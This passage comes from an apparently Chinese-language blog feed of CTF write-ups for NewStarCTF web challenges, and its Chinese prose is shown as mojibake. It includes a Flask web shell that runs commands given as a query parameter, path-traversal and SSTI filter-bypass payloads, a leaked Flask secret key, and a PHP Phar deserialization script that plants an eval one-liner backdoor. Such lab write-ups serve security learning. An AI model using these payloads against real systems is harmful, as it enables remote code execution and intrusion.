è½½ã€‚æ‰€ä»¥åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªèƒ½<code>rce</code>çš„<code>app.py</code>æ–‡ä»¶æŠŠåŸæ¥çš„è¦†ç›–ï¼Œå°±å¯ä»¥äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> os<br>app = Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <br>    <span class="hljs-keyword">try</span>:        <br>        cmd = request.args.get(<span class="hljs-string">&#x27;cmd&#x27;</span>)        <br>        data = os.popen(cmd).read()        <br>        <span class="hljs-keyword">return</span> data    <br>    <span class="hljs-keyword">except</span>:        <br>        <span class="hljs-keyword">pass</span>    <br>        <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:    <br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">5000</span>,debug=<span class="hljs-literal">True</span>) <span class="hljs-comment">#é¢˜ç›®æç¤ºäº†è¿è¡Œåœ¨5000ç«¯å£</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/flaskdisk2.png" alt="flaskdisk2"></p><h2 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">//Dockerfile<br><span class="hljs-keyword">FROM</span> vulhub/flask:<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span><br><span class="hljs-keyword">ENV</span> FLAG=flag&#123;not_here&#125;<br><span class="hljs-keyword">COPY</span><span class="language-bash"> src/ /app</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mv</span> /app/start.sh /start.sh &amp;&amp; <span class="hljs-built_in">chmod</span> 777 /start.sh</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [ <span class="hljs-string">&quot;/start.sh&quot;</span> ]</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p><img src="/img/injectme1.png" alt="injectme1"></p><p><code>/app</code>ç›®å½•æ³„éœ²ï¼Œé‡Œé¢æœ‰åŸæœ¬åœ¨<code>src</code>ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚</p><p><img src="/img/injectme2.png" alt="injectme2"></p><p>æ³¨æ„<code>URL</code></p><p><img src="/img/injectme3.png" alt="injectme3"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/download&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dwonload</span>():<br>filename = request.arg.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#ä»è¯·æ±‚çš„å‚æ•°ä¸­è·å–åä¸º &#x27;file&#x27; çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰æä¾›åˆ™é»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²ã€‚</span><br>    <span class="hljs-keyword">if</span> filename:<br>        filename = filename.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#../è¢«æ›¿æ¢æˆç©ºï¼Œå¯ä»¥è€ƒè™‘..././ç»•è¿‡</span><br>        filename = os.path.join(<span class="hljs-string">&#x27;static/img/&#x27;</span>, filename) <span class="hljs-comment">#å°†ç»è¿‡å¤„ç†çš„æ–‡ä»¶åä¸ &#x27;static/img/&#x27; ç›®å½•æ‹¼æ¥èµ·æ¥ï¼Œç”Ÿæˆæœ€ç»ˆçš„æ–‡ä»¶è·¯å¾„</span><br>        <span class="hljs-built_in">print</span>(filename)<br>        <span class="hljs-keyword">if</span> (os.path.exists(filename)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;start&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filename):<span class="hljs-comment">#æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”æ–‡ä»¶è·¯å¾„ä¸­ä¸åŒ…å« &quot;start&quot; å­—ç¬¦ä¸²</span><br>            <span class="hljs-keyword">return</span> send_file(filename)<br>        <span class="hljs-keyword">else</span>:<br>            abort(<span class="hljs-number">500</span>)<br>    <span class="hljs-keyword">else</span>:<br>        abort(<span class="hljs-number">404</span>)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ©ç”¨ç›®å½•ç©¿è¶Šå»æ‰¾<code>app,py</code>:</p><p><code>cancanneed?file=..././..././..././app/app.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> secret_key<br><br>app = Flask(__name__)<br>app.secret_key = secret_key<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():  <span class="hljs-comment"># put application&#x27;s code here</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/cancanneed&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cancanneed</span>():<br>    all_filename = os.listdir(<span class="hljs-string">&#x27;./static/img/&#x27;</span>)<br>    filename = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(os.listdir(<span class="hljs-string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/download&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        filename = filename.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        filename = os.path.join(<span class="hljs-string">&#x27;static/img/&#x27;</span>, filename)<br>        <span class="hljs-built_in">print</span>(filename)<br>        <span class="hljs-keyword">if</span> (os.path.exists(filename)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;start&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filename):<br>            <span class="hljs-keyword">return</span> send_file(filename)<br>        <span class="hljs-keyword">else</span>:<br>            abort(<span class="hljs-number">500</span>)<br>    <span class="hljs-keyword">else</span>:<br>        abort(<span class="hljs-number">404</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/backdoor&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(session.get(<span class="hljs-string">&quot;user&quot;</span>))<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;user&quot;</span>) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            session[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-string">&quot;guest&quot;</span><br>        name = session.get(<span class="hljs-string">&quot;user&quot;</span>)<br>        <span class="hljs-keyword">if</span> re.findall(<br>                <span class="hljs-string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,<br>                name):<br>            abort(<span class="hljs-number">500</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template_string(<br>                <span class="hljs-string">&#x27;ç«Ÿç„¶ç»™&lt;h1&gt;%s&lt;/h1&gt;ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &lt;br&gt; é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&lt;br&gt; æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜&#x27;</span> % name)<br>    <span class="hljs-keyword">except</span> Exception:<br>        abort(<span class="hljs-number">500</span>)<br><br></code></pre></td></tr></table></figure><p>æ³¨æ„<code>/backdoor</code>åˆ™ä¸ªè·¯ç”±ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œå­˜åœ¨<code>SSTI</code></p><p><code>from config import secret_key</code></p><p>ç›®å½•ç©¿è¶Šæ‰¾<code>config.py</code>:</p><p><code>cancanneed?file=..././..././..././app/config.py</code></p><p><code>secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</code></p><p>æŠ“åŒ…çœ‹<code>SESSION</code>:</p><p><img src="/img/injectme4.png" alt="injectme4"></p><p><code>eyJ1c2VyIjoiZ3Vlc3QifQ.ZWMqqQ.pyASrkelEUhTYiw79-4TDZ-IzwM</code></p><p>ä¹‹å‰åœ¨<code>Kali</code>ä¸‹è¿‡ï¼Œç›´æ¥ç”¨äº†ï¼š</p><p><img src="/img/injectme5.png" alt="injectme5"></p><p>æ³¨å…¥ç‚¹å°±æ˜¯è¿™ä¸ª<code>guest</code>äº†ï¼Œä½†è¿‡æ»¤äº†æŒºå¤šä¸œè¥¿ã€‚å¯ä»¥æŠŠ<code>guest</code>æ¢æˆ<code>&#123;%print(7*7)%&#125;</code>çœ‹çœ‹ï¼š</p><p><code>&#123;&#39;user&#39;: &#39;&#123;%print(7*7)%&#125;&#39;&#125;</code></p><p><img src="/img/injectme6.png" alt="injectme6"></p><p><img src="/img/injectme7.png" alt="injectme7"></p><p>å…¶å®<code>+</code>è¿™ä¸œè¥¿è¢«è¿‡æ»¤äº†æ— æ‰€è°“çš„ï¼Œ<code>[&quot;__cla&quot;&quot;ss__&quot;]</code>èƒ½è¾¾åˆ°åŒæ ·çš„æ•ˆæœ</p><p><code>&#123;&#39;user&#39;: &#39;&#123;%print(7*7)%&#125;&#39;&#125;</code></p><p><code>&#123;%%20print([]["__cl""ass__")%20%&#125;</code></p><h2 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h2><p><img src="/img/phar1.png" alt="phar1"></p><p>æºç ä¸­æç¤º<code>class.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd); <span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„exec</span><br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <br></code></pre></td></tr></table></figure><p><code>Pharååºåˆ—åŒ–</code>ï¼Œå‚è€ƒï¼š<code>https://mochu.blog.csdn.net/article/details/106909777</code></p><p>è¿™ä¸œè¥¿ä¸ªäººç†è§£ä¸»è¦å°±æ˜¯<code>phar</code>å‹ç¼©æ–‡ä»¶æ—¶ï¼Œä¼šåºåˆ—åŒ–ç”¨æˆ·å¯æ§çš„<code>meta-data</code>çš„å†…å®¹ã€‚ç„¶åå’Œ<code>phar://</code>åè®®é…åˆæŠŠè¿™ä¸ªå­—æ®µçš„å†…å®¹ååºåˆ—åŒ–ï¼Œä»è€Œè§¦å‘<code>__destruct()</code>ç­‰æ–¹æ³•ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>å‚è€ƒï¼šhttps:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/CoLo/</span>p/<span class="hljs-number">16786627</span>.html<br><span class="hljs-number">1</span>ã€pharæ–‡ä»¶èƒ½å¤Ÿä¸Šä¼ è‡³æœåŠ¡å™¨ <br><span class="hljs-regexp">//</span>å³è¦æ±‚å­˜åœ¨file_get_contents()ã€fopen()è¿™ç§å‡½æ•°<br><br><span class="hljs-number">2</span>ã€è¦æœ‰å¯åˆ©ç”¨çš„é­”æœ¯æ–¹æ³•<br><span class="hljs-regexp">//</span>è¿™ä¸ªçš„è¯ç”¨ä¸€ä½å¤§å¸ˆå‚…çš„è¯è¯´å°±æ˜¯åˆ©ç”¨é­”æœ¯æ–¹æ³•ä½œä¸º<span class="hljs-string">&quot;è·³æ¿&quot;</span><br><br><span class="hljs-number">3</span>ã€æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤<br><span class="hljs-regexp">//</span>ä¸€èˆ¬åˆ©ç”¨å§¿åŠ¿æ˜¯ä¸Šä¼ Pharæ–‡ä»¶åé€šè¿‡ä¼ªåè®®Pharæ¥å®ç°ååºåˆ—åŒ–ï¼Œä¼ªåè®®Pharæ ¼å¼æ˜¯`Phar:<span class="hljs-regexp">//</span>`è¿™ç§ï¼Œå¦‚æœè¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦è¢«è¿‡æ»¤å°±æ— æ³•å®ç°ååºåˆ—åŒ–<br><br><span class="hljs-number">4</span>ã€php.iniä¸­çš„phar.readonlyé€‰é¡¹ï¼Œéœ€è¦ä¸ºOffï¼ˆé»˜è®¤æ˜¯onï¼‰ã€‚<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨å‚è€ƒæ–‡ç« ä¸­çš„ä»£ç ç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„<code>phar</code>æ–‡ä»¶ï¼š</p><p>è¦æ³¨æ„çš„å°±æ˜¯<code>execæ˜¯æ²¡å›æ˜¾çš„ï¼Œå¦‚æœæ˜¯evalæˆ‘ä»¬ç›´æ¥å¯ä»¥å†™å‘½ä»¤è¿›å»</code></p><p>çœ‹äº†å®˜æ–¹çš„wpï¼Œå­¦ä¹ äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//whatsphar.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;cmd=<span class="hljs-string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>\</code>è¿™ä¸œè¥¿æ˜¯è½¬ä¹‰ç”¨çš„ï¼š</p><p><img src="/img/phar4.png" alt="phar4"></p><p>å¯¹äº<code>$a-&gt;cmd=&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#39;a&#39;]);\&quot;&gt;/var/www/html/1.php&quot;;</code></p><p>åˆ©ç”¨<code>echo</code>è¾“å‡º<code>&lt;?=@eval(\\\$_POST[&#39;a&#39;]);?&gt;</code>è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åæŠŠå®ƒé‡å®šå‘åˆ°<code>/var/www/html/1.php</code>ä¸­ã€‚ç®€å•è¯´å°±æ˜¯æŠŠä¸€å¥è¯æœ¨é©¬å†™åˆ°å¯¹åº”æ–‡ä»¶é‡Œã€‚</p><p>å¯ä»¥çœ‹ä¸‹<code>AI</code>è§£é‡Šï¼š</p><p><img src="/img/phar5.png" alt="phar5"></p><p>å†è¡¥å……ä¸€ä¸‹å…³äºè¿ç»­ä¸‰ä¸ªè½¬ä¹‰ç¬¦å·çš„è§£é‡Šã€‚ã€‚ç›´æ¥è´´æˆ‘å’Œ<code>x1r0z</code></p><p><img src="/img/phar9.png" alt="phar9"></p><p><img src="/img/phar10.png" alt="phar10"></p><p><img src="/img/phar11.png" alt="phar11"></p><p>å¦‚æœé¢˜ç›®ç»™çš„æ˜¯<code>eval</code>å°±æ²¡è¿™ä¹ˆéº»çƒ¦äº†ã€‚ã€‚</p><p>å¯ä»¥è‡ªå·±èµ·ä¸ªç¯å¢ƒï¼Œè®¿é—®<code>/whatphar.php</code>ï¼Œåœ¨æ ¹ç›®å½•åˆ·æ–°ä¸€ä¸‹å°±èƒ½å‡ºç°æˆ‘ä»¬éœ€è¦çš„<code>hacker.phar</code>æ–‡ä»¶äº†ã€‚</p><p>å¯¹äº<code>phar://</code>åè®®æ¥è¯´æ–‡ä»¶åä¸é‡è¦ï¼Œåªè¦å†…å®¹æ ¼å¼æ˜¯pharå³å¯è§¦å‘ååºåˆ—åŒ–ï¼š</p><p><img src="/img/phar3.png" alt="phar3"></p><p>ã€‚ã€‚è§¦å‘äº†è¿‡æ»¤ï¼Œæ£€æŸ¥äº†æ–‡ä»¶å†…å®¹å¹¶ä¸”ä¸å…è®¸å‡ºç°<code>__HALT_COMPILER();?&gt;</code>ã€‚</p><p>ä¸è¿‡å¯¹äº<code>Phar</code>æ–‡ä»¶ç»“æ„æ¥è¯´ï¼Œ<code>a sub</code>ä¸­è¦æ±‚<code>phar</code>æ–‡ä»¶å¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>ç»“å°¾ï¼Œå¦åˆ™æ— æ³•è¢«<code>pharæ‰©å±•</code>è¯†åˆ«ä¸º<code>phar</code>æ–‡ä»¶ã€‚</p><p>æœäº†ä¸‹<code>pharæ–‡ä»¶è¿‡æ»¤__HALT_COMPILER();?&gt;</code>ï¼š<code>https://cloud.tencent.com/developer/article/2278965</code></p><p>å¯ä»¥åˆ©ç”¨<code>gizp</code>å°†ç”Ÿæˆçš„Pharæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼š</p><p><img src="/img/phar8.png" alt="phar8"></p><p>ç„¶åå°†ç”Ÿæˆçš„<code>hello.jpg</code>ç›´æ¥ä¸Šä¼ ï¼Œä¼šç»™ä¸ªä¸Šä¼ è·¯å¾„ï¼š</p><p><img src="/img/phar6.png" alt="phar6"></p><p>è¿›<code>class.php</code>ï¼Œåˆ©ç”¨<code>phar</code>åè®®ååºåˆ—åŒ–ï¼š</p><p><code>file=phar://upload/f19fac1b1e7aa6a2df2d5cb5eada2d10.jpg</code></p><p>ç„¶åè®¿é—®<code>1.php</code>ï¼Œ<code>POST</code>ç»™<code>a</code>ä¼ å‚æ‰§è¡Œå‘½ä»¤å°±è¡Œäº†ã€‚</p><p><img src="/img/phar7.png" alt="phar7"></p><h2 id="OtenkiBoy"><a href="#OtenkiBoy" class="headerlink" title="OtenkiBoy"></a>OtenkiBoy</h2><p>è¿™é¢˜ä¸ä¼šã€‚ã€‚è·Ÿç€å®˜æ–¹<code>wp</code>åšçš„</p><p>ä¸‹è½½é™„ä»¶åå…ˆçœ‹<code>hint</code>:</p><p><img src="/img/otenboy1.png" alt="otenboy1"></p><p>è¿›å…¥<code>routes</code>ä¸‹(æ³¨æ„<code>merge</code>å‡½æ•°)ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//info.js</span><br><span class="hljs-keyword">const</span> &#123; mergeJSON, createDate &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./_components/utils&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-title function_">mergeJSON</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>), <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>), <span class="hljs-literal">true</span>);<br><span class="hljs-comment">//submit.js</span><br><span class="hljs-keyword">const</span> &#123; rndID, mergeJSON &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./_components/utils&quot;</span>);<br><span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">mergeJSON</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨<code>require</code>å¼•å…¥äº†ä¸€ä¸ªåä¸º<code>mergeJSON</code>çš„å‡½æ•°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//utils.js</span><br><span class="hljs-keyword">const</span> mergeJSON = <span class="hljs-keyword">function</span> (<span class="hljs-params">target, patch, deep = <span class="hljs-literal">false</span></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> patch !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> patch;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(patch)) <span class="hljs-keyword">return</span> patch; <span class="hljs-comment">// do not recurse into arrays</span><br>    <span class="hljs-keyword">if</span> (!target) target = &#123;&#125;<br>    <span class="hljs-keyword">if</span> (deep) &#123; target = <span class="hljs-title function_">copyJSON</span>(target), patch = <span class="hljs-title function_">copyJSON</span>(patch); &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> patch) &#123;<br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&quot;__proto__&quot;</span>) <span class="hljs-keyword">continue</span>; <span class="hljs-comment">//è¿™é‡Œè¿‡æ»¤äº†`__proto__ï¼Œå¯ä»¥ç”¨constructor.prototypeä»£æ›¿`</span><br>        <span class="hljs-keyword">if</span> (target[key] !== patch[key])<br>            target[key] = <span class="hljs-title function_">mergeJSON</span>(target[key], patch[key]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> target;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(æœªåšå®Œ)Writeup_2023_NewStarCTF_Week5</title>
    <link href="/2023/11/28/week5-Writeup_2023_NewStarCTF_Week5/"/>
    <url>/2023/11/28/week5-Writeup_2023_NewStarCTF_Week5/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTFç¬¬äº”å‘¨ï¼Œèœé¸Ÿçš„wp</p><span id="more"></span><hr><h2 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h2><p><img src="/img/week51.png" alt="week51"></p><p>æºç ä¸­å­˜åœ¨æç¤ºï¼š</p><p><img src="/img/week52.png" alt="week52"></p><p>åˆ·æ–°é¡µé¢å»çœ‹<code>cookie</code>ï¼š</p><p><img src="/img/week53.png" alt="week53"></p><p>è®¿é—®<code>pairing.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 